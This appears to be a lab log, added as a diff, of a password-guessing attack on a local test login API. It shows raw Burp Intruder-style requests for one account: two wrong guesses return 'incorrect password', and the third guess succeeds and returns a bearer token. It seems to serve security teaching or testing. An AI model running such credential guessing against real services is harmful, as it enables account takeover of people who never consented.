@@ -1,0 +1,51 @@
+#############################################################
+# ATTEMPT: guess #1  (wrong password, real account)
+#############################################################
+--- REQUEST (what Burp Intruder sends; § marks the payload) ---
+POST /api/login HTTP/1.1
+Host: 127.0.0.1:5000
+Content-Type: application/json
+
+{"email":"ben@fitnesshub.test","password":"123456"}
+
+--- RESPONSE (raw, captured via curl -i through the API) ---
+HTTP/1.1 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 31
+{"error":"incorrect password"}
+
+
+#############################################################
+# ATTEMPT: guess #13 (wrong password, real account)
+#############################################################
+--- REQUEST (what Burp Intruder sends; § marks the payload) ---
+POST /api/login HTTP/1.1
+Host: 127.0.0.1:5000
+Content-Type: application/json
+
+{"email":"ben@fitnesshub.test","password":"password1"}
+
+--- RESPONSE (raw, captured via curl -i through the API) ---
+HTTP/1.1 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 31
+{"error":"incorrect password"}
+
+
+#############################################################
+# ATTEMPT: guess #14 (CORRECT password -> 200 + token)
+#############################################################
+--- REQUEST (what Burp Intruder sends; § marks the payload) ---
+POST /api/login HTTP/1.1
+Host: 127.0.0.1:5000
+Content-Type: application/json
+
+{"email":"ben@fitnesshub.test","password":"password123"}
+
+--- RESPONSE (raw, captured via curl -i through the API) ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 95
+{"message":"login successful","token":"OeCQFj6p6n4D7Pin","token_type":"Bearer","user_id":1002}
+
+
